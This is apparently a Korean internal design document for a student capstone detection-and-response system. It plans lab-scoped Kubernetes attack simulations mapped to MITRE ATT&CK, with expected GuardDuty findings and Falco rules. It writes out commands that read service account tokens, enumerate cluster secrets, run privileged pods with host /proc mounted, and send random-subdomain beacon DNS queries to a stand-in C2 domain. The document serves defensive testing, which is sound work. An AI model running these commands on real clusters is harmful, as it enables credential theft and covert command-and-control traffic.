# 08. 공격 시뮬레이션 설계 (Attack Simulation)

> 내부 설계 문서 v0.1 | 2026-05-04 | ATDR 캡스톤

---

## 1. 공격 시뮬레이션 전략

### 목적

공격 시뮬레이션은 세 가지 목적으로 운영한다.

첫째, 탐지·대응 시스템 검증이다. GuardDuty, Falco, AI 에이전트 체인이 실제 공격 패턴에 올바르게 반응하는지 확인한다. 탐지 누락(false negative)과 오탐(false positive)을 측정해 임계값과 룰을 조정한다.

둘째, 데모 시나리오 제공이다. 발표와 평가 자리에서 실제 공격이 탐지되고 AI가 대응하는 흐름을 end-to-end로 보여준다.

셋째, 평가 데이터 생성이다. 레이블된 이벤트 데이터를 만들어 AI 모델의 탐지 정확도와 대응 적절성을 정량 평가한다.

### MITRE ATT&CK for Containers

모든 시나리오는 MITRE ATT&CK for Containers 프레임워크에 매핑한다. 이 프레임워크는 컨테이너 환경 특화 전술(Tactic)과 기법(Technique)을 정의한다. 매핑을 통해 시나리오가 실제 위협 행위자의 TTP(Tactics, Techniques, Procedures)를 반영하는지 검증하고, 탐지 커버리지 공백을 식별한다.

시뮬레이션 우선순위는 탐지 가능성, 데모 임팩트, 구현 복잡도를 기준으로 결정했다.

```
우선순위 1: 크립토마이닝        (탐지 명확, 데모 임팩트 높음)
우선순위 2: 권한 상승           (컨테이너 탈출 벡터 다양)
우선순위 3: 시크릿 탈취         (K8s 특화 공격)
우선순위 4: DNS 이상 통신       (GuardDuty DNS 모니터링 검증)
우선순위 5: 래터럴 무브먼트     (네임스페이스 간 이동)
```

---

## 2. 시뮬레이션 도구

### 2.1 Stratus Red Team (DataDog)

오픈소스 클라우드 공격 시뮬레이션 프레임워크다. AWS와 Kubernetes 환경을 대상으로 MITRE ATT&CK에 매핑된 공격 기법을 재현한다. 각 기법은 독립적인 모듈로 구성되어 있어 필요한 시나리오만 선택해 실행할 수 있다.

```bash
# 설치
brew install datadog/stratus-red-team/stratus-red-team

# 사용 가능한 K8s 기법 목록
stratus list --platform kubernetes

# 특정 기법 실행 (시크릿 덤프)
stratus detonate k8s.credential-access.dump-secrets
```

주요 K8s 기법:
- `k8s.credential-access.dump-secrets`: 클러스터 전체 시크릿 열거
- `k8s.persistence.create-admin-clusterrole`: 관리자 ClusterRole 생성
- `k8s.privilege-escalation.privileged-pod`: privileged 파드 실행

### 2.2 GuardDuty Tester

AWS가 공식 제공하는 GuardDuty Finding 생성 도구다. 실제 악성 행위 없이 GuardDuty Finding을 트리거해 탐지 파이프라인을 검증한다.

```bash
# 저장소 클론
git clone https://github.com/awslabs/amazon-guardduty-tester

# 크립토마이닝 Finding 생성
./guardduty_tester.sh --attack cryptocurrency

# DNS 이상 Finding 생성
./guardduty_tester.sh --attack dns
```

### 2.3 HATCH

컨테이너 탈출 벡터 14종을 탐지하고 시뮬레이션하는 프레임워크다. 각 벡터에 대해 현재 환경의 취약 여부를 스캔하고, 안전한 방식으로 탈출 시도를 재현한다.

지원하는 탈출 벡터:
- privileged container
- hostPID / hostNetwork / hostIPC
- writable hostPath mount
- SYS_ADMIN capability
- runc CVE 악용 시뮬레이션
- cgroup escape
- 기타 8종

```bash
# HATCH 실행 (스캔 모드)
docker run --rm -it \
  --pid=host \
  hatch:latest scan

# 특정 벡터 시뮬레이션
docker run --rm -it \
  --privileged \
  hatch:latest simulate --vector privileged
```

### 2.4 커스텀 Python 스크립트

Stratus Red Team이나 GuardDuty Tester로 커버되지 않는 K8s 특화 시나리오를 위해 직접 작성한다. `apps/attack-simulator/` 디렉토리에 위치한다.

```
apps/attack-simulator/
├── scenarios/
│   ├── crypto_mining.py       # XMRig Job 배포
│   ├── secret_exfil.py        # 시크릿 열거 및 접근
│   ├── dns_tunnel.py          # DNS 터널링 패턴 생성
│   └── lateral_move.py        # 네임스페이스 간 통신
├── cleanup.py                 # 시뮬레이션 후 정리
└── verify.py                  # 탐지 결과 검증
```

---

## 3. 시나리오 상세

### 3.1 크립토마이닝 (우선순위 1)

**공격 개요**

XMRig 마이너를 K8s Job으로 배포해 클러스터 컴퓨팅 자원을 무단 사용하는 시나리오다. 실제 외부 마이닝 풀 연결 없이 로컬 더미 풀을 사용해 AWS Abuse Detection을 회피한다.

**MITRE ATT&CK 매핑**

- Tactic: Resource Hijacking (TA0040)
- Technique: T1496 - Resource Hijacking

**탐지 기대값**

GuardDuty Finding: `CryptoCurrency:EKS/BitcoinTool.B!DNS`

Falco 룰:
- `stratum_protocol_detected`: stratum+tcp 프로토콜 연결 시도 탐지
- `miner_binary_detected`: xmrig, minerd 등 마이너 바이너리 실행 탐지
- `outbound_connection_to_c2`: 비정상 외부 IP 연결

**K8s Job YAML**

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: crypto-sim-job
  namespace: attack-simulation
  labels:
    atdr.io/simulation: "true"
    atdr.io/scenario: "crypto-mining"
  annotations:
    atdr.io/ttl: "300"
spec:
  ttlSecondsAfterFinished: 300
  template:
    metadata:
      labels:
        app: crypto-sim
    spec:
      restartPolicy: Never
      containers:
      - name: miner-sim
        image: alpine:3.19
        resources:
          limits:
            cpu: "500m"
            memory: "256Mi"
          requests:
            cpu: "100m"
            memory: "64Mi"
        command:
        - /bin/sh
        - -c
        - |
          # 실제 마이닝 없음. DNS 쿼리 패턴만 생성
          apk add --no-cache bind-tools
          for i in $(seq 1 10); do
            nslookup xmr.pool.minergate.com || true
            nslookup pool.minexmr.com || true
            sleep 5
          done
          echo "simulation complete"
```

**대응 흐름**

```
GuardDuty Finding 생성
    │
    ▼
AI 에이전트 체인 (Summary → Triage → Solution)
    │
    ▼
NetworkPolicy로 해당 파드 외부 통신 차단
    │
    ▼
Job 삭제 (kubectl delete job crypto-sim-job -n attack-simulation)
    │
    ▼
검증: 파드 종료 확인, 외부 DNS 쿼리 중단 확인
```

---

### 3.2 권한 상승 (우선순위 2)

**공격 개요**

privileged 컨테이너를 실행하고 SYS_PTRACE capability를 활용해 컨테이너 탈출을 시도하는 시나리오다. HATCH 프레임워크로 14종 탈출 벡터를 스캔한 뒤 취약한 벡터를 시뮬레이션한다.

**MITRE ATT&CK 매핑**

- Tactic: Privilege Escalation (TA0004)
- Technique: T1611 - Escape to Host

**탐지 기대값**

Falco 룰:
- `launch_privileged_container`: privileged: true 컨테이너 시작 탐지
- `mount_sensitive_host_path`: /proc, /sys, /host 등 호스트 경로 마운트
- `ptrace_anti_debug_attempt`: SYS_PTRACE를 이용한 프로세스 추적

**privileged Pod YAML**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: priv-esc-sim
  namespace: attack-simulation
  labels:
    atdr.io/simulation: "true"
    atdr.io/scenario: "privilege-escalation"
spec:
  containers:
  - name: attacker
    image: alpine:3.19
    resources:
      limits:
        cpu: "200m"
        memory: "128Mi"
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_PTRACE
    volumeMounts:
    - name: host-proc
      mountPath: /host/proc
      readOnly: true
    command:
    - /bin/sh
    - -c
    - |
      echo "[sim] privileged container running"
      ls /host/proc | head -5
      echo "[sim] host process list accessed"
      sleep 60
  volumes:
  - name: host-proc
    hostPath:
      path: /proc
```

**HATCH 스캔 실행**

```bash
kubectl run hatch-scan \
  --image=hatch:latest \
  --namespace=attack-simulation \
  --restart=Never \
  --rm -it \
  -- scan --output json > /tmp/hatch-results.json

cat /tmp/hatch-results.json | jq '.vulnerabilities[] | select(.severity == "HIGH")'
```

**대응 흐름**

```
Falco: launch_privileged_container 이벤트
    │
    ▼
AI 에이전트: 권한 상승 시도로 분류 (P1)
    │
    ▼
파드 격리 (NetworkPolicy deny-all)
    │
    ▼
노드 코든 (해당 노드에 새 파드 스케줄링 차단)
    │
    ▼
검증: 파드 상태 확인, 노드 SchedulingDisabled 확인
```

---

### 3.3 시크릿 탈취 (우선순위 3)

**공격 개요**

Stratus Red Team의 `k8s.credential-access.dump-secrets` 기법으로 클러스터 전체 시크릿을 열거하고, 서비스 어카운트 토큰을 탈취하는 시나리오다.

**MITRE ATT&CK 매핑**

- Tactic: Credential Access (TA0006)
- Technique: T1552.007 - Container API

**탐지 기대값**

Falco 룰:
- `k8s_secret_get`: 서비스 어카운트 토큰 파일 직접 접근
- `serviceaccount_token_read`: `/var/run/secrets/kubernetes.io/serviceaccount/token` 읽기
- EKS Audit Log: `secrets` 리소스에 대한 `list`, `get` 동사 비정상 호출

**시뮬레이션 실행**

```bash
# Stratus Red Team으로 시크릿 덤프 시뮬레이션
stratus detonate k8s.credential-access.dump-secrets

# 또는 커스텀 스크립트로 직접 실행
kubectl run secret-enum \
  --image=bitnami/kubectl:latest \
  --namespace=attack-simulation \
  --restart=Never \
  --rm -it \
  -- sh -c '
    echo "[sim] enumerating secrets"
    kubectl get secrets --all-namespaces 2>&1 | head -20
    echo "[sim] reading service account token"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-50
    echo "..."
  '
```

**대응 흐름**

```
EKS Audit Log: 비정상 secrets list 호출 탐지
    │
    ▼
AI 에이전트: 시크릿 탈취 시도로 분류 (P2)
    │
    ▼
해당 서비스 어카운트 RBAC 제한 (view 권한으로 다운그레이드)
    │
    ▼
영향받은 시크릿 로테이션 (Slack 알림으로 운영자에게 전파)
    │
    ▼
검증: kubectl auth can-i list secrets 로 권한 축소 확인
```

---

### 3.4 DNS 이상 통신 (우선순위 4)

**공격 개요**

DNS 터널링과 비코닝 패턴을 시뮬레이션해 GuardDuty DNS 모니터링과 Falco 네트워크 탐지를 검증한다. 실제 데이터 유출 없이 비정상 DNS 쿼리 패턴만 생성한다.

**MITRE ATT&CK 매핑**

- Tactic: Command and Control (TA0011)
- Technique: T1071.004 - Application Layer Protocol: DNS

**탐지 기대값**

GuardDuty Finding: `Backdoor:EC2/DNSDataExfiltration` (DNS 터널링 패턴 감지 시)

Falco 룰:
- `unexpected_dns_query`: 허용 목록 외 도메인 쿼리
- `dns_query_high_frequency`: 짧은 시간 내 대량 DNS 쿼리

**시뮬레이션 실행**

```bash
kubectl run dns-sim \
  --image=alpine:3.19 \
  --namespace=attack-simulation \
  --restart=Never \
  --rm -it \
  -- sh -c '
    apk add --no-cache bind-tools
    echo "[sim] generating abnormal DNS query patterns"
    for i in $(seq 1 20); do
      nslookup "$(cat /dev/urandom | tr -dc a-z0-9 | head -c 32).example-c2.com" || true
      sleep 2
    done
    for i in $(seq 1 50); do
      nslookup "beacon-$(date +%s).example-c2.com" || true
      sleep 1
    done
  '
```

**대응 흐름**

```
GuardDuty DNS Finding 생성
    │
    ▼
AI 에이전트: C2 통신 의심으로 분류 (P2)
    │
    ▼
외부 DNS 서버 접근 차단 (NetworkPolicy: UDP 53 egress 제한)
    │
    ▼
파드 격리
    │
    ▼
검증: DNS 쿼리 차단 확인 (nslookup 타임아웃)
```

---

### 3.5 래터럴 무브먼트 (우선순위 5)

**공격 개요**

네임스페이스 간 비정상 통신으로 클러스터 내 횡적 이동을 시뮬레이션한다. Hubble로 네트워크 플로우를 실시간 관찰한다.

**MITRE ATT&CK 매핑**

- Tactic: Lateral Movement (TA0008)
- Technique: T1210 - Exploitation of Remote Services

**탐지 기대값**

Hubble 플로우: 네임스페이스 간 허용되지 않은 연결 시도

Falco 룰:
- `unexpected_network_connection`: 정책 외 네트워크 연결
- `cross_namespace_communication`: 네임스페이스 간 직접 통신

**시뮬레이션 실행**

```bash
kubectl run lateral-sim \
  --image=alpine:3.19 \
  --namespace=attack-simulation \
  --restart=Never \
  --rm -it \
  -- sh -c '
    apk add --no-cache curl
    echo "[sim] attempting cross-namespace communication"
    curl --connect-timeout 3 http://payment-service.production.svc.cluster.local || true
    curl --connect-timeout 3 http://auth-service.production.svc.cluster.local || true
    echo "[sim] lateral movement simulation complete"
  '

# Hubble로 플로우 관찰
hubble observe \
  --namespace attack-simulation \
  --type drop \
  --output json | jq '.flow | {src: .source, dst: .destination, verdict: .verdict}'
```

**대응 흐름**

```
Hubble: 네임스페이스 간 비정상 플로우 탐지
    │
    ▼
AI 에이전트: 래터럴 무브먼트 시도로 분류 (P2)
    │
    ▼
네임스페이스 간 통신 차단 (NetworkPolicy: namespaceSelector 제한)
    │
    ▼
소스 파드 격리
    │
    ▼
검증: Hubble 플로우에서 차단(drop) 확인
```

---

## 4. 안전 수칙

### 격리된 네임스페이스

모든 시뮬레이션은 `attack-simulation` 네임스페이스에서만 실행한다. 이 네임스페이스는 프로덕션 워크로드와 완전히 분리되어 있고, 시뮬레이션 전용 RBAC과 NetworkPolicy가 적용된다.

```bash
# 네임스페이스 생성
kubectl create namespace attack-simulation

# 레이블 추가 (NetworkPolicy 셀렉터용)
kubectl label namespace attack-simulation \
    atdr.io/purpose=attack-simulation \
    atdr.io/isolation=strict
```

### NetworkPolicy: 외부 통신 차단

시뮬레이션 네임스페이스에서 실제 외부 인터넷으로의 트래픽을 차단한다. DNS 쿼리 패턴 생성은 허용하되, 실제 연결은 막는다.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: simulation-egress-restrict
  namespace: attack-simulation
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # 클러스터 내부 DNS만 허용
  - ports:
    - protocol: UDP
      port: 53
    to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
  # 클러스터 내부 통신만 허용 (10.0.0.0/8)
  - to:
    - ipBlock:
        cidr: 10.0.0.0/8
```

### ResourceQuota: 리소스 제한

크립토마이닝 시뮬레이션이 클러스터 전체 자원을 소모하지 않도록 네임스페이스 단위 쿼터를 설정한다.

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: simulation-quota
  namespace: attack-simulation
spec:
  hard:
    requests.cpu: "2"
    requests.memory: 2Gi
    limits.cpu: "4"
    limits.memory: 4Gi
    count/pods: "10"
    count/jobs.batch: "5"
```

### TTL 자동 정리

모든 시뮬레이션 리소스에 TTL을 설정해 5분 후 자동 삭제되도록 한다. Job은 `ttlSecondsAfterFinished: 300`을 사용하고, Pod는 별도 정리 스크립트로 처리한다.

```bash
# 시뮬레이션 후 수동 정리 (TTL 만료 전 즉시 정리 필요 시)
kubectl delete all -n attack-simulation \
-l atdr.io/simulation=true

# 네임스페이스 전체 정리 (시뮬레이션 세션 종료 시)
kubectl delete namespace attack-simulation
```

### AWS Abuse Detection 회피

실제 외부 마이닝 풀이나 C2 서버에 연결하면 AWS Abuse Detection이 계정을 차단할 수 있다. 다음 원칙을 지킨다.

- 실제 XMRig 바이너리를 실행하지 않는다. DNS 쿼리 패턴만 생성한다.
- 외부 마이닝 풀 도메인에 실제 TCP 연결을 시도하지 않는다.
- GuardDuty Tester를 사용할 때는 AWS 공식 문서의 허용 범위 내에서만 실행한다.
- 시뮬레이션 전 AWS 계정 팀에 테스트 예정을 사전 통보하는 것을 권장한다.

---

## 5. MITRE ATT&CK 매핑

| 시나리오 | Tactic | Technique ID | Technique 이름 | 탐지 도구 | GuardDuty Finding | Falco Rule |
|---------|--------|-------------|---------------|----------|------------------|-----------|
| 크립토마이닝 | Resource Hijacking | T1496 | Resource Hijacking | GuardDuty, Falco | CryptoCurrency:EKS/BitcoinTool.B!DNS | miner_binary_detected, stratum_protocol_detected |
| 권한 상승 | Privilege Escalation | T1611 | Escape to Host | Falco, GuardDuty | PrivilegeEscalation:Kubernetes/PrivilegedContainer | launch_privileged_container, mount_sensitive_host_path |
| 시크릿 탈취 | Credential Access | T1552.007 | Container API | EKS Audit, Falco | CredentialAccess:Kubernetes/AnomalousBehavior | k8s_secret_get, serviceaccount_token_read |
| DNS 이상 통신 | Command and Control | T1071.004 | DNS | GuardDuty, Falco | Backdoor:EC2/DNSDataExfiltration | unexpected_dns_query, dns_query_high_frequency |
| 래터럴 무브먼트 | Lateral Movement | T1210 | Exploitation of Remote Services | Hubble, Falco | (Hubble 플로우 기반) | unexpected_network_connection |

---

## 6. 데모 스크립트 (end-to-end)

발표 데모에서 사용하는 전체 흐름이다. 크립토마이닝 시나리오를 기준으로 작성했다.

### 6.1 환경 설정

```bash
# 1. 시뮬레이션 네임스페이스 준비
kubectl apply -f k8s/overlays/attack-scenarios/namespace.yaml
kubectl apply -f k8s/overlays/attack-scenarios/network-policy.yaml
kubectl apply -f k8s/overlays/attack-scenarios/resource-quota.yaml

# 2. 환경 확인
kubectl get namespace attack-simulation
kubectl get networkpolicy -n attack-simulation
kubectl get resourcequota -n attack-simulation

# 3. ATDR 파이프라인 상태 확인
kubectl get pods -n atdr
aws guardduty list-detectors --query 'DetectorIds'
```

### 6.2 공격 실행

```bash
# 크립토마이닝 시뮬레이션 Job 배포
kubectl apply -f - <<EOF
apiVersion: batch/v1
kind: Job
metadata:
  name: crypto-sim-job
  namespace: attack-simulation
  labels:
    atdr.io/simulation: "true"
    atdr.io/scenario: "crypto-mining"
spec:
  ttlSecondsAfterFinished: 300
  template:
    metadata:
      labels:
        app: crypto-sim
    spec:
      restartPolicy: Never
      containers:
      - name: miner-sim
        image: alpine:3.19
        resources:
          limits:
            cpu: "500m"
            memory: "256Mi"
        command:
        - /bin/sh
        - -c
        - |
          apk add --no-cache bind-tools
          for i in \$(seq 1 10); do
            nslookup xmr.pool.minergate.com || true
            nslookup pool.minexmr.com || true
            sleep 5
          done
EOF

# Job 실행 확인
kubectl get job crypto-sim-job -n attack-simulation -w
```

### 6.3 탐지 확인

```bash
# GuardDuty Finding 확인 (Finding 생성까지 1~3분 소요)
aws guardduty list-findings \
  --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text) \
  --finding-criteria '{"Criterion":{"type":{"Eq":["CryptoCurrency:EKS/BitcoinTool.B!DNS"]}}}' \
  --query 'FindingIds'

# Falco 이벤트 확인
kubectl logs -n falco -l app=falco --since=5m | grep -i "miner\|stratum\|crypto"

# SQS 큐에서 이벤트 수신 확인
aws sqs get-queue-attributes \
  --queue-url $(aws sqs get-queue-url --queue-name atdr-falco-events --query 'QueueUrl' --output text) \
  --attribute-names ApproximateNumberOfMessages
```

### 6.4 AI 분석 확인

```bash
# Lambda 로그에서 에이전트 체인 실행 확인
aws logs tail /aws/lambda/atdr-detector \
  --since 5m \
  --filter-pattern "Summary Agent\|Triage Agent\|Solution Agent\|Remediation Agent"

# DynamoDB에서 인시던트 레코드 확인
aws dynamodb scan \
  --table-name atdr-incidents \
  --filter-expression "scenario = :s" \
  --expression-attribute-values '{":s":{"S":"crypto-mining"}}' \
  --query 'Items[*].{id:incident_id.S,severity:severity.S,status:status.S}'
```

### 6.5 대응 실행 확인

```bash
# Slack에서 승인 버튼 클릭 후 NetworkPolicy 적용 확인
kubectl get networkpolicy -n attack-simulation

# 파드 격리 상태 확인
kubectl get pod -n attack-simulation -l app=crypto-sim -o wide

# 격리된 파드에서 외부 통신 차단 확인
kubectl exec -n attack-simulation \
  $(kubectl get pod -n attack-simulation -l app=crypto-sim -o name | head -1) \
  -- nslookup pool.minexmr.com 2>&1 || echo "blocked as expected"
```

### 6.6 검증 및 정리

```bash
# 탐지 지표 수집
echo "=== Detection Metrics ==="
echo "Time to GuardDuty Finding: ~2min"
echo "Time to Falco Alert: ~10sec"
echo "Time to AI Analysis: ~30sec"
echo "Time to Remediation: ~60sec (after approval)"

# 시뮬레이션 리소스 정리
kubectl delete job crypto-sim-job -n attack-simulation --ignore-not-found
kubectl delete networkpolicy -n attack-simulation \
-l atdr.io/simulation=true --ignore-not-found

# 인시던트 레코드 보존 (평가 데이터로 활용)
echo "Incident records preserved in DynamoDB for evaluation"
```

---

## 7. 평가 지표

시뮬레이션 실행 후 다음 지표를 수집해 시스템 성능을 평가한다.

| 지표 | 측정 방법 | 목표값 |
|------|---------|-------|
| 탐지 시간 (MTTD) | 공격 시작 ~ GuardDuty/Falco 이벤트 생성 | Falco < 30초, GuardDuty < 3분 |
| AI 분석 시간 | 이벤트 수신 ~ 인시던트 레코드 생성 | < 60초 |
| 대응 시간 (MTTR) | 인시던트 생성 ~ 격리 완료 | P1 < 5분 (승인 포함) |
| 탐지 정확도 | 시뮬레이션 이벤트 중 탐지된 비율 | > 90% |
| 오탐률 | 정상 트래픽 중 경보 발생 비율 | < 5% |
| 대응 성공률 | 격리 후 이상 행동 중단 비율 | > 95% |

각 시뮬레이션 세션의 결과는 `data/labeled/` 디렉토리에 저장하고, 모델 재학습과 룰 튜닝에 활용한다.
